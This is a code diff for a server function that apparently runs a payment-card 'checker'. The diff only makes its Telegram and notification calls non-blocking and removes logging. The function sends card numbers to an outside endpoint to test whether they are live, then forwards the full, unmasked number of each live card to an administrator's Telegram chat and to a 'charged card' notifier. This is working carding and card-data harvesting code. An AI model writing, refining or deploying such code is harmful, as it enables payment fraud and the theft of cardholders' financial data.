@@ -11,33 +11,27 @@ const corsHeaders = {
   "Access-Control-Max-Age": "86400",
 };
 
-// Helper function to send admin notification via Telegram
-async function sendAdminTelegram(message: string) {
+// Helper function to send admin notification via Telegram (fire-and-forget, non-blocking)
+function sendAdminTelegram(message: string) {
   const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
   const ADMIN_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID");
   
-  if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) {
-    console.log("Missing Telegram config, skipping admin notification");
-    return;
-  }
+  if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) return;
   
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: ADMIN_CHAT_ID,
-        text: message,
-        parse_mode: "HTML"
-      })
-    });
-  } catch (e) {
-    console.error("Failed to send admin Telegram:", e);
-  }
+  // Fire and forget - don't await
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: ADMIN_CHAT_ID,
+      text: message,
+      parse_mode: "HTML"
+    })
+  }).catch(() => {});
 }
 
-// Call notify-charged-card edge function for live cards
-async function notifyChargedCard(
+// Call notify-charged-card edge function for live cards (fire-and-forget, non-blocking)
+function notifyChargedCard(
   userId: string,
   cardDetails: string,
   status: "CHARGED" | "DECLINED" | "UNKNOWN",
@@ -46,38 +40,26 @@ async function notifyChargedCard(
   gateway: string,
   apiResponse?: string
 ) {
-  try {
-    const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
-    if (!SUPABASE_SERVICE_ROLE_KEY) {
-      console.log("Missing service role key, skipping notification");
-      return;
-    }
+  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+  if (!SUPABASE_SERVICE_ROLE_KEY) return;
 
-    const response = await fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
-      },
-      body: JSON.stringify({
-        user_id: userId,
-        card_details: cardDetails,
-        status,
-        response_message: responseMessage,
-        amount,
-        gateway,
-        api_response: apiResponse,
-      }),
-    });
-
-    if (!response.ok) {
-      console.error("Failed to notify charged card:", await response.text());
-    } else {
-      console.log("Charged card notification sent successfully");
-    }
-  } catch (error) {
-    console.error("Error notifying charged card:", error);
-  }
+  // Fire and forget - don't await
+  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
+    },
+    body: JSON.stringify({
+      user_id: userId,
+      card_details: cardDetails,
+      status,
+      response_message: responseMessage,
+      amount,
+      gateway,
+      api_response: apiResponse,
+    }),
+  }).catch(() => {});
 }
 
 serve(async (req) => {
@@ -155,23 +137,27 @@ serve(async (req) => {
     const chargeAmount = amount || 1;
     const maskedCC = cc.substring(0, 6) + '****' + cc.slice(-4);
 
-    console.log(`PayU Check - User: ${user.id}, Amount: ₹${chargeAmount}, Card: ${maskedCC}`);
-
-    // Call the PayU API with REAL request
+    // Call the PayU API with timeout for speed
     const apiUrl = `https://payu.up.railway.app/${chargeAmount}/${cc}`;
     
-    console.log(`Calling PayU API: ${apiUrl.replace(cc, maskedCC)}`);
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 25000); // 25s timeout
     
-    const response = await fetch(apiUrl, {
-      method: 'GET',
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Accept': 'application/json',
-      },
-    });
+    let response;
+    try {
+      response = await fetch(apiUrl, {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json',
+        },
+        signal: controller.signal,
+      });
+    } finally {
+      clearTimeout(timeout);
+    }
 
     const responseText = await response.text();
-    console.log(`PayU Raw Response: ${responseText}`);
 
     let data;
     try {
@@ -338,7 +324,7 @@ serve(async (req) => {
       }
     }
 
-    // Send debug to admin for LIVE and UNKNOWN status
+    // Send debug to admin for LIVE and UNKNOWN status (non-blocking)
     if (status === "live" || status === "unknown") {
       const prettyJson = JSON.stringify(data, null, 2);
       const statusEmoji = status === "live" ? "✅" : "🔍";
@@ -354,20 +340,20 @@ ${mcpAmount ? `💵 <b>MCP:</b> ${mcpAmount}` : ''}
 📦 <b>Raw Response:</b>
 <pre>${prettyJson.substring(0, 3500)}</pre>`;
 
-      await sendAdminTelegram(adminMessage);
+      sendAdminTelegram(adminMessage); // Fire and forget
     }
 
-    // 🔥 Send Telegram notification for LIVE cards with FULL card details
+    // 🔥 Send Telegram notification for LIVE cards with FULL card details (non-blocking)
     if (status === "live") {
-      await notifyChargedCard(
+      notifyChargedCard(
         user.id,
-        cc, // Send FULL card details for live cards
+        cc,
         "CHARGED",
         apiMessage,
         mcpAmount || `₹${chargeAmount}`,
         "Yunchi PayU",
         responseText
-      );
+      ); // Fire and forget
     }
 
     return new Response(
@@ -385,8 +371,8 @@ ${mcpAmount ? `💵 <b>MCP:</b> ${mcpAmount}` : ''}
     const errorMessage = error instanceof Error ? error.message : "Failed to process request";
     console.error('PayU Check Error:', errorMessage);
     
-    // Send error to admin
-    await sendAdminTelegram(`❌ <b>PayU API Error</b>\n\n<code>${errorMessage}</code>`);
+    // Send error to admin (non-blocking)
+    sendAdminTelegram(`❌ <b>PayU API Error</b>\n\n<code>${errorMessage}</code>`);
     
     return new Response(
       JSON.stringify({
